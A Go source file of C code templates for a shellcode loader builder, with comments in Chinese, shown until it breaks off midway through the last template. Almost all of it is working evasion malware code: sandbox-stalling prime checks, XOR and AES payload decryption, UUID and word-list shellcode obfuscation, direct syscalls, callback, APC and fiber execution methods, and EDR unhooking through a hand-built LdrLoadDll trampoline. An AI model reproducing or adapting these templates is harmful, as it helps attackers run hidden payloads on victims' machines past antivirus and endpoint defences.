package Loader

// 反沙箱代码
// 在主函数中调用 去判断质数
var __c__sandbox = `
	isPrime(1000000000000002493);
	isPrime(1000000000000002481);
	isPrime(1000000000000002319);
	isPrime(1000000000000002271);
	isPrime(1000000000000002217);
	isPrime(1000000000000002137);
	isPrime(1000000000000002097);
	isPrime(1000000000000002049);
	isPrime(1000000000000001953);
	isPrime(1000000000000002481);

`

// 回调函数加载
var __c__syscall_callback = `
    DWORD oldProtect;
    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__syscall__earlyBird = `
    DWORD oldProtect;
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
 	VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
	//VAVNtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
	//VAVNtTestAlert();
    testAlert();	
	
`

// 纤程加载
var __c__syscall__fiber = `
    DWORD oldProtect;
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    SwitchToFiber(shellcodeFiber);
`

// uuid混淆
var __c__uuid = `
	const char* uuids[] = { %s };
	int num_uuids = sizeof(uuids) / sizeof(uuids[0]); 
    char* xpp = (char*)malloc(num_uuids * sizeof(UUID));

	if (xpp == NULL) {
		// 内存分配失败处理
		return -1;
	}
	for (int i = 0; i < num_uuids; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(xpp + i * sizeof(UUID)));
		if (status != RPC_S_OK) {
			free(xpp);
			return -1; // UUID 字符串转换失败
		}
	}
    unsigned int length = num_uuids * sizeof(UUID);

`

// english_words混淆模板
var __c__words = `
	const char* names[] = { %s };
    const char* name[] = { %s };
	unsigned char xpp[sizeof(name)];

    for (int sc_index = 0; sc_index < sizeof(xpp); sc_index++) {
        for (int tt_index = 0; tt_index < sizeof(names); tt_index++)
        {
            if (names[tt_index] == name[sc_index]) {
                xpp[sc_index] = tt_index;
                break;
            }
        }
    }
    unsigned int length = sizeof(name) / sizeof(name[0]);

`

// c xor 模板
var __c__syscall__xor = `
#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
REPLACE_STSYSCALL_Framework
#include <Rpc.h>

typedef VOID(NTAPI* myNtTestAlert)(VOID);


char url1[] = "https://www.google.com/search?q=";
char url3[] = "https://www.bing.com/search?q=";
char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
char filePath1[] = "C:/Users/username/Documents/file.txt";
char filePath2[] = "/home/user/documents/file.txt";
char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";


void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

bool isPrime(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {
	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    My_Xor((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}

`

// c aes 模板
var __c__syscall__aes = `

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <Windows.h>
#include <lmcons.h>
#include <lm.h>
#include "aes.h"
REPLACE_STSYSCALL_Framework

typedef VOID(NTAPI* myNtTestAlert)(VOID);

bool isPrime(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {

	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
    struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, xpp, length);

	void* addr = NULL;
	SIZE_T allocationSize = length;

	REPLACE_Loading_Technique

    free(xpp);

    return 0;
}
`

// unhook模板
// unhook加载方式
var __c__unhook_callback = `
    DWORD oldProtect;
    addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);
	MyEnumCalendarInfoA((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__unhook__earlyBird = `
    DWORD oldProtect;
	addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);
	MyQueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
    MyNtTestAlert();
`

// 纤程加载
var __c__unhook__fiber = `
    DWORD oldProtect;
    PVOID mainFiber = MyConvertThreadToFiber(NULL);
    addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = MyCreateFiber((SIZE_T) NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    MySwitchToFiber(shellcodeFiber);
`

// unhook_aes
var __c__unhook__aes = `
#include <Windows.h>
#include "aes.h"
#include <stdio.h>
#include <tlhelp32.h>


#define OBJ_CASE_INSENSITIVE 0x00000040L

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef NTSTATUS(NTAPI* pNewLdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
typedef int(WINAPI* pMessageBoxW)(
        _In_opt_ HWND hWnd,
        _In_opt_ LPCWSTR lpText,
        _In_opt_ LPCWSTR lpCaption,
        _In_ UINT uType
);
PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

SIZE_T StringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

_Bool isPrime(long long n) {
    if (n <= 1) {
        return 0;
    }

    for (long long i = 2; i * i <= n; ++i) {
        if (n %% i == 0) {
            return 0;
        }
    }

    return 1;
}


int main()
{
 	pNewLdrLoadDll LdrLoadrDll;
    UNICODE_STRING user32dll;
    UNICODE_STRING kernel32dll;
    UNICODE_STRING ntdlldll;

    OBJECT_ATTRIBUTES objectAttributes_user32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };


    wchar_t user32_dll[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'};
    wchar_t kernel32_dll[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    wchar_t ntdll_dll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };

    char ldr_load_dll[] = { L'L', L'd', L'r', L'L', L'o', L'a', L'd', L'D', L'l', L'l', L'\0' };
    char ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    char kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

    //Obtaining LdrLoadDll Address from loaded NTDLL
    RtlInitUnicodeString(&user32dll, user32_dll);
    RtlInitUnicodeString(&kernel32dll, kernel32_dll);
    RtlInitUnicodeString(&ntdlldll, ntdll_dll);


    InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    char get_module_handle_a[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', '\0' };
    typedef HMODULE(WINAPI* pGetModuleHandleA1)(
            LPCSTR lpModuleName
    );

    pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
    char get_proc_address[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
    typedef FARPROC(WINAPI* pGetProcAddress)(
            HMODULE hModule,
            LPCSTR lpProcName
    );
    pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
    char virtual_alloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
    typedef LPVOID(WINAPI* pVirtualAlloc)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flAllocationType,
            DWORD flProtect
    );

    pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
    char virtual_protect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
    typedef BOOL(WINAPI* pVirtualProtect)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flNewProtect,
            PDWORD lpflOldProtect
    );
    pVirtualProtect MyVirtualProtect1 = (pVirtualProtect)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32),(LPCSTR)virtual_protect);

    FARPROC  origLdrLoadDll = MyGetProcAddress1(GetModuleHandleA(ntdll), (LPCSTR)ldr_load_dll);
#ifdef _WIN64
    //Setting up the structure of the trampoline for the instructions
    unsigned char jumpPrelude[] = { 0x49, 0xBB };
    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
    *(void**)(jumpAddress) = jmpAddr;
    LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // mov qword ptr[rsp + 10h]  原始的LdrLoadDll中汇编，使用我们自己的防止被hook
    // mov r11,address
    // jmp rll
    // ret
    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5c\x24\x10", 5);
    //Setting up the JMP address in the original LdrLoadDll
    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);
    DWORD oldProtect1 = 0;
    MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
    LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);


    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
            LPVOID lpParameter
    );

    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);

    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);

    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pCreateFiber)(
            SIZE_T dwStackSize,
            LPFIBER_START_ROUTINE lpStartAddress,
            LPVOID lpParameter
    );

    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);

    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef VOID(WINAPI* pSwitchToFiber)(
            LPVOID lpFiber
    );

    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
    typedef BOOL(WINAPI* pEnumCalendarInfo)(
            CALINFO_ENUMPROCA lpCalInfoEnumProc,
            LCID Locale,
            CALID Calendar,
            CALTYPE CalType
    );
    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);

    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
    typedef BOOL(WINAPI* pQueueUserAPC)(
            PAPCFUNC pfnAPC,
            HANDLE hThread,
            ULONG_PTR dwData
    );

    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
    typedef NTSTATUS(NTAPI* pNtTestAlert)(
            VOID
    );

    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
#else
    //  x86 架构下的代码
	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x2);

	unsigned char jumpPrelude[] = { 0xB8 };
	unsigned char jumpAddress[] = { 0x65, 0x72, 0x45, 0x77 };
	unsigned char jumpEpilogue[] = { 0xFF, 0xE0, 0xC3 };
	*(void**)(jumpAddress) = jmpAddr;

	CCopyMemory(trampoline, (PVOID)"\x89\xFF", 2);
	CCopyMemory((PBYTE)trampoline + 2, jumpPrelude, sizeof jumpPrelude);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude, jumpAddress, sizeof jumpAddress);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude + sizeof jumpAddress, jumpEpilogue, sizeof jumpEpilogue);
	DWORD oldProtect1 = 0;
	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
	LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);


    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
            LPVOID lpParameter
    );

    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);

    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);

    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pCreateFiber)(
            SIZE_T dwStackSize,
            LPFIBER_START_ROUTINE lpStartAddress,
            LPVOID lpParameter
    );

    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);

    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef VOID(WINAPI* pSwitchToFiber)(
            LPVOID lpFiber
    );

    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
    typedef BOOL(WINAPI* pEnumCalendarInfo)(
            CALINFO_ENUMPROCA lpCalInfoEnumProc,
            LCID Locale,
            CALID Calendar,
            CALTYPE CalType
    );
    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);

    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
    typedef BOOL(WINAPI* pQueueUserAPC)(
            PAPCFUNC pfnAPC,
            HANDLE hThread,
            ULONG_PTR dwData
    );

    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
    typedef NTSTATUS(NTAPI* pNtTestAlert)(
            VOID
    );

    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
#endif
    ;

	REPLACR_OBFUSCATION

    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
	struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, xpp, length);

    SIZE_T allocationSize = length;
    void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}
`

// unhook_xor
var __c__unhook__xor = `
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


#define OBJ_CASE_INSENSITIVE 0x00000040L

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef NTSTATUS(NTAPI* pNewLdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
typedef int(WINAPI* pMessageBoxW)(
        _In_opt_ HWND hWnd,
        _In_opt_ LPCWSTR lpText,
        _In_opt_ LPCWSTR lpCaption,
        _In_ UINT uType
);
PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

SIZE_T StringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

_Bool isPrime(long long n) {
    if (n <= 1) {
        return 0;
    }

    for (long long i = 2; i * i <= n; ++i) {
        if (n %% i == 0) {
            return 0;
        }
    }

    return 1;
}

void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main()
{
    pNewLdrLoadDll LdrLoadrDll;
    UNICODE_STRING user32dll;
    UNICODE_STRING kernel32dll;
    UNICODE_STRING ntdlldll;

    OBJECT_ATTRIBUTES objectAttributes_user32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };


    wchar_t user32_dll[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'};
    wchar_t kernel32_dll[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    wchar_t ntdll_dll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };

    char ldr_load_dll[] = { L'L', L'd', L'r', L'L', L'o', L'a', L'd', L'D', L'l', L'l', L'\0' };
    char ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    char kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

    //Obtaining LdrLoadDll Address from loaded NTDLL
    RtlInitUnicodeString(&user32dll, user32_dll);
    RtlInitUnicodeString(&kernel32dll, kernel32_dll);
    RtlInitUnicodeString(&ntdlldll, ntdll_dll);


    InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    char get_module_handle_a[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', '\0' };
    typedef HMODULE(WINAPI* pGetModuleHandleA1)(
            LPCSTR lpModuleName
    );

    pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
    char get_proc_address[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
    typedef FARPROC(WINAPI* pGetProcAddress)(
            HMODULE hModule,
            LPCSTR lpProcName
    );
